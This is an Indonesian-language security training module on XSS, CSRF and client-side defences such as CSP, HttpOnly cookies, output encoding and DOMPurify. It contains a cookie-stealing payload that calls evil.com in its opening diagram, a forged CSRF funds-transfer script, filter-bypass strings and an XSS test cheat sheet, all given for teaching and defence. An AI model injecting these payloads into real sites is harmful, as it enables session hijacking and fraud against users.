# MODUL 5: OWASP TOP 10: CROSS-SITE SCRIPTING (XSS), CSRF & PERTAHANAN CLIENT-SIDE

## 1. Definisi dan Bahaya Eksploitasi Sisi Klien (Client-Side)
Cross-Site Scripting (XSS) adalah kerentanan keamanan web di mana penyerang menyuntikkan script berbahaya (hampir selalu bahasa JavaScript) ke dalam halaman web yang sah dan tepercaya. Kerentanan ini terdaftar di **MITRE CWE-79** dan merupakan salah satu pilar ancaman pada **OWASP Top 10 A03:2021**.

Berbeda dengan SQL Injection yang menargetkan server basis data internal, serangan XSS menargetkan **peramban (*browser*) pengguna lain yang mengunjungi aplikasi web tersebut**.

```text
                     [ PENYERANG ]
                           │
       (1) Injeksi Payload │ <script>fetch('https://evil.com/steal?c='+document.cookie)</script>
                           ▼
                 [ APLIKASI WEB RENTAN ]
                 (Menyimpan tanpa sanitasi)
                           │
  (2) Membuka Halaman Web │ Mengembalikan payload sebagai HTML sah
                           ▼
                  [ BROWSER KORBAN ]
         Peramban mengeksekusi JavaScript penyerang!
         Kredensial Session Token dicuri otomatis!
```

### Dampak Kritis Eksploitasi XSS:
- **Pencurian Session Cookie & Token:** Mengambil alih sesi akun pengguna secara penuh (*Session Hijacking*).
- **Keylogging Tersembunyi:** Menangkap setiap ketukan keyboard korban saat mengetik password atau nomor kartu kredit.
- **Phishing Virtual & Defacement:** Mengubah tampilan dokumen DOM, menampilkan form login palsu di atas halaman resmi.
- **Penyebaran Worm XSS:** Memaksa browser korban mengirimkan payload XSS ke akun teman-temannya secara otomatis.

---

## 2. Tiga Klasifikasi Utama Serangan XSS

| Parameter | Stored XSS (Persistent) | Reflected XSS (Non-Persistent) | DOM-Based XSS |
| :--- | :--- | :--- | :--- |
| **Lokasi Penyimpanan** | Database server permanen (komentar, ulasan, profil) | Tidak disimpan; terpantul di URL/query parameter | Terjadi murni di memori DOM peramban klien |
| **Pemicu Eksekusi** | Setiap pengunjung yang membuka halaman web korban | Korban mengklik link phishing khusus yang dibuat penyerang | Eksekusi script JavaScript internal aplikasi yang tidak aman |
| **Tingkat Keparahan** | **Kritis Ekstrem** (1 infeksi = ribuan korban) | **Tinggi** (Perlu interaksi klik korban) | **Tinggi** (Sulit dideteksi oleh WAF jaringan) |

### Pembedahan Mendalam DOM-Based XSS: Konsep Source & Sink
DOM XSS terjadi sepenuhnya di sisi klien tanpa perlu mengirim payload kembali ke server. Kerentanan lahir dari kombinasi antara **Source** yang tidak aman dengan **Sink** yang berbahaya:

```text
[ SOURCE (Tempat Input Berbahaya Masuk) ]
• location.search (query parameter URL)
• location.hash (#fragment di URL)
• document.referrer
• window.name

                 │ Mengalir tanpa sanitasi
                 ▼

[ SINK (Fungsi Eksekusi DOM Berbahaya) ]
• element.innerHTML = userControlledInput;  <-- SANGAT BAHAYA!
• document.write(userControlledInput);      <-- SANGAT BAHAYA!
• eval(userControlledInput);                <-- SANGAT BAHAYA!
• setTimeout(userControlledInput, 1000);    <-- SANGAT BAHAYA!
```

---

## 3. Hubungan Simbiotik: XSS dan Cross-Site Request Forgery (CSRF)
CSRF (Cross-Site Request Forgery) adalah serangan di mana penyerang memperdaya browser korban untuk mengeksekusi request HTTP yang tidak diinginkan pada situs web tempat korban sedang terotentikasi (misal: mentransfer uang ke rekening penyerang).

### Mengapa XSS Mematikan Seluruh Proteksi CSRF?
Pertahanan standar CSRF mengandalkan **Anti-CSRF Token** acak yang disematkan pada form HTML. Namun, jika aplikasi memiliki celah XSS:
```javascript
// Script XSS dapat membaca token CSRF dari DOM dan mengirimkan request atas nama korban!
const token = document.querySelector('input[name="csrf_token"]').value;
fetch('/api/transfer-funds', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ to_account: '999123', amount: 50000000, csrf_token: token })
});
```
Kesimpulannya: **Jika sebuah halaman web rentan terhadap XSS, seluruh mekanisme proteksi CSRF di halaman tersebut gugur total!**

---

## 4. Arsitektur Pertahanan Modern: Content Security Policy (CSP Level 3)
Content Security Policy (CSP) adalah header HTTP response deklaratif yang memberi tahu peramban sumber daya (*resources*) apa saja yang sah untuk dimuat dan dieksekusi.

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-EDN98234jdR' https://trusted-cdn.com; object-src 'none'; base-uri 'self';
```

### Komponen Kunci Directive CSP:
- `default-src 'self'` : Hanya izinkan aset dari domain sendiri secara default.
- `script-src 'self' 'nonce-...'` : Melarang eksekusi inline script (`<script>alert(1)</script>`) KECUALI script tersebut memiliki atribut `nonce` kriptografi unik yang dicocokkan oleh server pada setiap render halaman.
- `object-src 'none'` : Mematikan plugin berbahaya seperti Flash atau Java Applet.
- `frame-ancestors 'none'` : Mencegah website dimasukkan ke dalam iframe situs lain (pertahanan mutlak terhadap serangan **Clickjacking**).

---

## 5. Pertahanan Session Cookie: Atribut Wajib Keamanan
Jika token sesi disimpan dalam cookie browser, server WAJIB menyematkan 4 atribut perlindungan:

```http
Set-Cookie: session_token=a9f4c398e21d; Path=/; Secure; HttpOnly; SameSite=Strict
```

1. **HttpOnly:** **Pertahanan XSS Terpenting!** Melarang script JavaScript peramban mengakses nilai cookie (`document.cookie` menghasilkan string kosong). Penyerang tidak bisa mencuri token via script!
2. **Secure:** Memastikan cookie HANYA dikirimkan melalui saluran komunikasi terenkripsi HTTPS.
3. **SameSite=Strict:** Mencegah peramban mengirimkan cookie pada request lintas domain (mitigasi utama terhadap serangan CSRF).

---

## 6. Sanitasi Input vs Context-Aware Output Encoding
Banyak pengembang keliru membuat fungsi filter manual sederhana seperti:
```javascript
// FILTER GAGAL & SANGAT MUDAH DIBYPASS!
text = text.replace("<script>", "").replace("</script>", "");
// Penyerang cukup memasukkan: <scr<script>ipt>alert(1)</script>
// Atau menggunakan tag HTML lain: <img src=x onerror=alert(1)>
```

### Aturan Baku Pertahanan:
1. **Konversi ke Entitas HTML Aman (Output Encoding):**
   - `<` menjadi `&lt;`
   - `>` menjadi `&gt;`
   - `"` menjadi `&quot;`
   - `'` menjadi `&#x27;`
   - `&` menjadi `&amp;`
2. **Gunakan Safe DOM APIs:** Gunakan `element.textContent = input` alih-alih `element.innerHTML`.
3. **Gunakan Library Sanitasi Teruji:** Jika aplikasi memang harus mengizinkan format teks kaya (*Rich Text/WYSIWYG*), gunakan library standar industri seperti **DOMPurify**:
   ```javascript
   import DOMPurify from 'dompurify';
   const cleanHtml = DOMPurify.sanitize(userContent);
   ```

---

## 7. Studi Kasus Nyata: Samy Worm di MySpace & Serangan Magecart
- **Samy Worm (2005):** Samy Kamkar mengeksploitasi celah Stored XSS pada kolom profil media sosial MySpace. Script yang disuntikkan secara otomatis menambahkan Samy sebagai pahlawan profil dan menyalin script tersebut ke profil korban yang melihatnya. Dalam waktu **kurang dari 20 jam**, worm ini menginfeksi lebih dari **1.000.000 pengguna**, menjadikannya salah satu malware dengan penyebaran tercepat dalam sejarah internet.
- **British Airways Magecart Attack (2018):** Kelompok kriminal siber Magecart menyuntikkan 22 baris script JavaScript berbahaya ke perpustakaan pihak ketiga di server web British Airways. Script ini bertindak sebagai form-grabber yang merekam nomor kartu kredit, masa berlaku, dan CVV dari 380.000 transaksi pemesanan tiket, berujung pada denda regulator GDPR sebesar **£20 Juta GBP**.

---

## 8. Panduan Teknis & Cheatsheet Pengujian XSS
```html
<!-- 1. Payload Pengujian Standar Alert -->
<script>alert(document.domain)</script>

<!-- 2. Payload Event Handler Bypassing Tag Script Filter -->
<img src="invalid_image.jpg" onerror="alert(document.domain)">
<svg onload="alert(document.cookie)">

<!-- 3. Payload JavaScript Pseudo-Protocol pada Tag Anchor Link -->
<a href="javascript:alert(1)">Klik Klaim Hadiah</a>

<!-- 4. Payload DOM-Based via Hash Parameter -->
https://target.com/page#<img src=x onerror=alert(1)>
```

---

## 9. Referensi & Standar Kepatuhan Resmi
- **OWASP Top 10:2021:** *Category A03:2021 - Injection (XSS)*.
- **W3C Recommendation:** *Content Security Policy Level 3*.
- **RFC 6265bis:** *Cookies: HTTP State Management Mechanism*.
- **CWE-79:** *Improper Neutralization of Input During Web Page Generation ('Cross-Site Scripting')*.


---

## 10. Operational Security Playbook: Client-Side Defense
Panduan pengamanan antarmuka frontend dan peramban pengguna:

<div class="cyber-checklist">
  <div class="checklist-title">
    <i class="fa-solid fa-shield-virus"></i> SOP Pertahanan Client-Side & Perlindungan Session Cookie
  </div>
  <div class="checklist-row">
    <i class="fa-solid fa-square-check checklist-check"></i>
    <div><strong>Tegakkan Cookie HttpOnly:</strong> Seluruh session cookie dan token otentikasi wajib disematkan atribut `HttpOnly` dan `Secure`.</div>
  </div>
  <div class="checklist-row">
    <i class="fa-solid fa-square-check checklist-check"></i>
    <div><strong>Implementasi CSP Level 3:</strong> Terapkan header `Content-Security-Policy` dengan pembatasan domain script dan token nonce kriptografis.</div>
  </div>
  <div class="checklist-row">
    <i class="fa-solid fa-square-check checklist-check"></i>
    <div><strong>Sanitasi Input dengan DOMPurify:</strong> Jika aplikasi mendukung input format kaya (HTML), wajib gunakan parser pembersih DOMPurify.</div>
  </div>
  <div class="checklist-row">
    <i class="fa-solid fa-square-check checklist-check"></i>
    <div><strong>Gunakan Context-Aware Safe APIs:</strong> Hindari fungsi manipulasi DOM berisiko (`innerHTML`) dan utamakan `textContent`.</div>
  </div>
  <div class="checklist-row">
    <i class="fa-solid fa-square-check checklist-check"></i>
    <div><strong>Anti-Clickjacking Headers:</strong> Tambahkan directive `frame-ancestors 'none'` untuk melarang situs dimuat di dalam iframe situs lain.</div>
  </div>
</div>

---

## 11. Kamus Istilah & Glosarium Akronim Kunci

| Akronim / Istilah | Kepanjangan Resmi | Definisi Operasional |
| :--- | :--- | :--- |
| <span class="glossary-term">XSS</span> | *Cross-Site Scripting* | Kerentanan penyuntikan skrip berbahaya yang dieksekusi di peramban pengguna sah. |
| <span class="glossary-term">DOM</span> | *Document Object Model* | Representasi pohon objek dokumen HTML yang dapat dimanipulasi oleh JavaScript. |
| <span class="glossary-term">CSRF</span> | *Cross-Site Request Forgery* | Eksploitasi yang memaksa peramban pengguna mengeksekusi request ilegal lintas domain. |
| <span class="glossary-term">CSP</span> | *Content Security Policy* | Header HTTP deklaratif yang membatasi sumber aset yang sah dimuat oleh browser. |
| <span class="glossary-term">SRI</span> | *Subresource Integrity* | Fitur verifikasi hash kriptografi pada file CDN pihak ketiga (`<script integrity="sha384-...">`). |
